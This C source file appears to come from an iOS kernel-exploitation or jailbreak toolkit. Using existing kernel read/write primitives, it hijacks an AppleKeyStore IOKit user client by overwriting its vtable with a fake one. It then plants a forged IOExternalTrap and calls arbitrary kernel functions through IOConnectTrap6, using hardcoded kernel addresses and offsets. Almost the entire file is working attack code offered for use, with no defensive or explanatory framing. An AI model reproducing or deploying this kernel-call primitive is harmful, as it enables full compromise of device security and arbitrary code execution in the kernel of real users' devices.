#include "kcall.h"

#include "IOKitLib.h"
#include "kernel_memory.h"
#include "tasks.h"

#include <assert.h>
#include <stdarg.h>

static io_connect_t connection;

static uint64_t user_client;

static const size_t kernel_buffer_size = 0x4000;

static uint64_t kernel_buffer;

static uint64_t kernel_buffer;

static uint64_t fake_trap;

static const size_t max_vtable_size = 0x1000;

static uint64_t original_vtable;

static bool create_user_client()
{
	const char *service_name = "AppleKeyStore";

	io_iterator_t iter;

	kern_return_t kr = IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching(service_name), &iter);

	if(iter == MACH_PORT_NULL)
	{
		fprintf(stderr, "Could not get service matching %s\n", service_name);

		return false;
	}

	while(1)
	{
		mach_port_t service = IOIteratorNext(iter);

		if(service == MACH_PORT_NULL)
		{
			fprintf(stderr, "Could not find service matching %s\n", service_name);

			IOObjectRelease(iter);

			return false;
		}

		kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
		IOObjectRelease(service);

		if(kr == KERN_SUCCESS)
			break;

		fprintf(stderr, "%s returned 0x%x: %s", "IOServiceOpen", kr, mach_error_string(kr));
		fprintf(stderr, "Could not open service named %s", service_name);
	}

	return true;
}

static void get_user_client_address()
{
	uint64_t user_client_port;

	bool ok = kernel_ipc_port_lookup(current_task, connection, &user_client_port, NULL);

	if(!ok)
	{
		fprintf(stderr, "Could not look up user client's kernel address\n");

		exit(-1);
	}

	user_client = kernel_read64(user_client_port + OFFSET(ipc_port, ip_kobject));
}

static bool allocate_kernel_buffer()
{
	kernel_buffer = kernel_vm_allocate(kernel_buffer_size);

	if(kernel_buffer == 0)
	{
		fprintf(stderr, "Could not allocate kernel_buffer\n");

		return false;
	}

	fake_trap = kernel_buffer + kernel_buffer_size - SIZE(IOExternalTrap);

	return true;
}

static uint64_t kernel_read_vtable_method(uint64_t vtable, uint64_t index)
{
	return kernel_read64(vtable + index * sizeof(uint64_t));
}

static uint64_t* copyout_user_client_vtable()
{
	original_vtable = kernel_read64(user_client);

	uint64_t *vtable_contents = malloc(max_vtable_size);

	kernel_read(original_vtable, vtable_contents, max_vtable_size);

	return vtable_contents;
}

static size_t patch_user_client_vtable(uint64_t *vtable)
{
	uint64_t IOUserClient__getTargetAndTrapForIndex = kernel_read_vtable_method(ADDRESS(IOUserClient__vtable),
																	VTABLE_INDEX(IOUserClient, getTargetAndTrapForIndex));
	vtable[VTABLE_INDEX(IOUserClient, getTargetAndTrapForIndex)] = IOUserClient__getTargetAndTrapForIndex;

	vtable[VTABLE_INDEX(IOUserClient, getExternalTrapForIndex)] = ADDRESS(IORegistryEntry__getRegistryEntryID);

	size_t count = 0;

	for(; count < max_vtable_size / sizeof(*vtable); count++)
	{
		if(vtable[count] == 0)
			break;
	}

	return count * sizeof(*vtable);
}

static void patch_user_client(uint64_t *vtable, size_t size)
{
	uint64_t vtable_pointer = kernel_buffer;

	kernel_write(vtable_pointer, vtable, size);

	uint64_t reserved_field = user_client + OFFSET(IORegistryEntry, reserved);
	uint64_t reserved = kernel_read64(reserved_field);

	uint64_t id_field = reserved + OFFSET(IORegistryEntry__ExpansionData, fRegistryEntryID);
	kernel_write64(id_field, fake_trap);

	kernel_write64(user_client, vtable_pointer);
}

static void unpatch_user_client()
{
	kernel_write64(user_client, original_vtable);
}

static uint32_t kernel_call_7v_internal(uint64_t function, size_t argument_count, uint64_t arguments[])
{
	uint64_t args[7] = { 1 };

	for(int i = 0; i < argument_count; i++)
		args[i] = arguments[i];

	uint8_t trap_data[SIZE(IOExternalTrap)];

	FIELD(trap_data, IOExternalTrap, object, uint64_t) = args[0];
	FIELD(trap_data, IOExternalTrap, function, uint64_t) = function;
	FIELD(trap_data, IOExternalTrap, offset, uint64_t) = 0;

	kernel_write(fake_trap, trap_data, SIZE(IOExternalTrap));

	uint32_t result = IOConnectTrap6(connection, 0, args[1], args[2], args[3], args[4], args[5], args[6]);

	return result;
}

bool
kernel_call_init() {
	SIZE(IOExternalTrap)                                     = 24;
	
	OFFSET(IOExternalTrap, object)                           = 0;
	OFFSET(IOExternalTrap, function)                         = 8;
	OFFSET(IOExternalTrap, offset)                           = 16;
	OFFSET(IORegistryEntry, reserved)                        = 16;
	OFFSET(IORegistryEntry__ExpansionData, fRegistryEntryID) = 8;
	
	VTABLE_INDEX(IOUserClient, getExternalTrapForIndex)      = 0x5c0 / 8;
	VTABLE_INDEX(IOUserClient, getTargetAndTrapForIndex)     = 0x5c8 / 8;

	ADDRESS(IOUserClient__vtable)                = SLIDE(0xFFFFFFF00791CCD8);
	ADDRESS(IORegistryEntry__getRegistryEntryID) = SLIDE(0xFFFFFFF0080FFDE0);

	bool ok;

	if(current_task == 0)
	{
		ok = kernel_tasks_init();

		if(!ok)
		{
			fprintf(stderr, "current_task not initialized, exiting\n");

			exit(-1);
		}
	}

	ok = create_user_client();

	if(!ok)
	{
		fprintf(stderr, "Could not create user client %s\n", "AppleKeyStore");

		return false;
	}

	get_user_client_address();

	ok = allocate_kernel_buffer();

	if(!ok) return false;

	uint64_t *vtable = copyout_user_client_vtable();

	size_t vtable_size = patch_user_client_vtable(vtable);

	patch_user_client(vtable, vtable_size);

	free(vtable);

	return true;

	return ok;
}

bool
kernel_call_deinit() {
	
	if(original_vtable)
	{
		unpatch_user_client();
		original_vtable = 0;
	}

	if(kernel_buffer)
	{
		kernel_vm_deallocate(kernel_buffer, kernel_buffer_size);
		kernel_buffer = 0;
		fake_trap = 0;
	}

	if(MACH_PORT_VALID(connection))
	{
		IOServiceClose(connection);

		connection = MACH_PORT_NULL;
	}

	return true;
}


uint32_t kernel_call_7(uint64_t function, size_t argument_count, ...)
{
	uint64_t arguments[7];
	va_list ap;

	if(argument_count > 7)
	{
		fprintf(stderr, "kernel_call_7: argument count incorrect\n");

		exit(-1);
	}

	va_start(ap, argument_count);

	for(size_t i = 0; i < argument_count; i++)
		arguments[i] = va_arg(ap, uint64_t);

	va_end(ap);

	return kernel_call_7v_internal(function, argument_count, arguments);
}